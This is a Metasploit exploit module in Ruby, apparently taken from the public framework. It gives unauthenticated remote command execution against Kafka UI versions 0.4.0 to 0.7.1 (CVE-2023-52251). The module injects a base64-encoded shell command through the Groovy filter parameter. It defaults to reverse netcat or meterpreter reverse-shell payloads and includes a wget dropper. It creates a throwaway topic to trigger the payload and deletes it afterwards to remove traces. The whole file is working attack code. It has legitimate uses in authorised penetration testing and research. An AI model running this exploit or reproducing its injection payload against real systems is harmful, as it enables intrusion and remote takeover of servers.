##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Kafka UI Unauthenticated Remote Command Execution via the Groovy Filter option.',
        'Description' => %q{
          A command injection vulnerability exists in Kafka ui between `v0.4.0` and `v0.7.1` allowing
          an attacker to inject and execute arbitrary shell commands via the `groovy` filter parameter
          at the `topic` section.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'BobTheShopLifter and Thingstad', # Discovery of the vulnerability CVE-2023-52251

        ],
        'References' => [
          ['CVE', '2023-52251'],
          ['URL', 'https://attackerkb.com/topics/ATJ1hTVB8H/cve-2023-52251'],
          ['URL', 'https://github.com/BobTheShoplifter/CVE-2023-52251-POC']
        ],
        'DisclosureDate' => '2023-09-27',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix/Linux Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => [ARCH_CMD],
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_netcat'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'echo', 'printf', 'bourne'],
              'Linemax' => 16384,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8080,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def vuln_version?
    @version = ''
    res = send_request_cgi({
      'method' => 'GET',
      'ctype' => 'application/json',
      'uri' => normalize_uri(target_uri.path, 'actuator', 'info')
    })
    if res && res.code == 200 && (res.body.include?('build') || res.body.include?('git'))
      res_json = res.get_json_document
      unless res_json.blank?
        if res.body.include?('build')
          @version = res_json['build']['version'].delete_prefix('v') # remove v from vx.x.x
        elsif res.body.include?('git')
          # determine version by using git commit id by querying api.github.com/repos/provectus/kafka-ui/tags.
          git_commit_id = res_json['git']['commit']['id']
          # git commit id 38c4cf7 is for whatever reason not listed when quering api.github.com, so we handle this manually
          if git_commit_id == '38c4cf7'
            @version = '0.3.3'
          else
            # !!! overwriting datastore options is not neat, but I frankly do not know how to do this nicely.
            # !!! suggestions are welcome ;-)
            rhost = datastore['RHOSTS']
            rport = datastore['RPORT']
            ssl = datastore['SSL']
            datastore['RHOSTS'] = 'api.github.com'
            datastore['RPORT'] = 443
            datastore['SSL'] = true
            res = send_request_cgi({
              'method' => 'GET',
              'ctype' => 'application/json',
              'uri' => normalize_uri(target_uri.path, 'repos', 'provectus', 'kafka-ui', 'tags')
            })
            datastore['RHOSTS'] = rhost
            datastore['RPORT'] = rport
            datastore['SSL'] = ssl
            if res && res.code == 200
              res_json = res.get_json_document
              unless res_json.blank?
                # loop thru the list of commits and return the version based a match on the first 7 chars of the sha commit else return nil
                res_json.each do |tag|
                  if tag['commit']['sha'][0, 7] == git_commit_id
                    @version = tag['name'].delete_prefix('v')
                    break
                  end
                end
              end
            end
          end
        end
      end
      return Rex::Version.new(@version) <= Rex::Version.new('0.7.1') && Rex::Version.new(@version) >= Rex::Version.new('0.4.0') if @version.match(/\d\.\d\.\d/)
    end
    false
  end

  def get_cluster
    res = send_request_cgi({
      'method' => 'GET',
      'ctype' => 'application/json',
      'uri' => normalize_uri(target_uri.path, 'api', 'clusters')
    })
    if res && res.code == 200 && res.body.include?('status')
      res_json = res.get_json_document
      unless res_json.blank?
        # loop thru list of clusters and return an active cluster with topic count > 0 else return nil
        res_json.each do |cluster|
          if cluster['status'] == 'online' || cluster['topicCount'] > 0
            return cluster['name']
          end
        end
      end
    end
    nil
  end

  def create_topic(cluster)
    topic_name = Rex::Text.rand_text_alphanumeric(4..10)
    post_data = {
      name: topic_name.to_s,
      partitions: 1,
      replicationFactor: 1,
      configs:
        {
          'cleanup.policy': 'delete',
          'retention.bytes': '-1'
        }
    }.to_json
    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'uri' => normalize_uri(target_uri.path, 'api', 'clusters', cluster.to_s, 'topics'),
      'data' => post_data.to_s
    })
    if res && res.code == 200 && res.body.include?(topic_name.to_s)
      res_json = res.get_json_document
      unless res_json.blank?
        return res_json['name']
      end
    end
    nil
  end

  def delete_topic(cluster, topic)
    res = send_request_cgi({
      'method' => 'DELETE',
      'ctype' => 'application/json',
      'uri' => normalize_uri(target_uri.path, 'api', 'clusters', cluster.to_s, 'topics', topic.to_s)
    })
    return true if res && res.code == 200

    false
  end

  def produce_message(cluster, topic)
    # Create a dummy message to trigger the groovy script execution
    post_data = {
      partition: 0,
      key: 'null',
      content: 'null',
      keySerde: 'String',
      valueSerde: 'String'
    }.to_json
    res = send_request_cgi({
      'method' => 'POST',
      'ctype' => 'application/json',
      'uri' => normalize_uri(target_uri.path, 'api', 'clusters', cluster.to_s, 'topics', topic.to_s, 'messages'),
      'data' => post_data.to_s
    })
    return true if res && res.code == 200

    false
  end

  def execute_command(cmd, _opts = {})
    cmd_line = "echo #{Base64.strict_encode64(cmd)}|base64 -d|sh"
    payload = "Process p=new ProcessBuilder(\"sh\",\"-c\",\"#{cmd_line}\").redirectErrorStream(true).start()"
    return send_request_cgi({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'api', 'clusters', @cluster.to_s, 'topics', @new_topic.to_s, 'messages'),
      'vars_get' => {
        'q' => payload.to_s,
        'filterQueryType' => 'GROOVY_SCRIPT',
        'attempt' => 2,
        'limit' => 100,
        'page' => 0,
        'seekDirection' => 'FORWARD',
        'keySerde' => 'String',
        'valueSerde' => 'String',
        'seekType' => 'BEGINNING'
      }
    })
  end

  def check
    vprint_status("Checking if #{peer} can be exploited.")
    return CheckCode::Appears("Kafka-ui version: #{@version}") if vuln_version?

    unless @version.blank?
      if @version.match(/\d\.\d\.\d/)
        return CheckCode::Safe("Kafka-ui version: #{@version}")
      else
        return CheckCode::Detected("Kafka-ui unknown version: #{@version}")
      end
    end
    CheckCode::Safe
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    vprint_status('Searching for active Kafka cluster...')
    @cluster = get_cluster
    fail_with(Failure::NotFound, 'Could not find or connect to an active Kafka cluster.') if @cluster.nil?
    vprint_good("Active Kafka cluster found: #{@cluster}")

    vprint_status('Creating a new topic...')
    @new_topic = create_topic(@cluster)
    fail_with(Failure::Unknown, 'Could not create a new topic.') if @new_topic.nil?
    vprint_good("New topic created: #{@new_topic}")

    vprint_status('Trigger Groovy script payload execution by creating a message...')
    fail_with(Failure::PayloadFailed, 'Could not trigger the Groovy script payload execution.') unless produce_message(@cluster, @new_topic)

    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager({ linemax: target.opts['Linemax'] })
    end

    # cleaning up the mess and remove new created topic
    vprint_status('Removing tracks...')
    if delete_topic(@cluster, @new_topic)
      vprint_good("Successfully deleted topic #{@new_topic}.")
    else
      print_error("Could not delete topic #{@new_topic}. Manually cleaning required.")
    end
  end
end
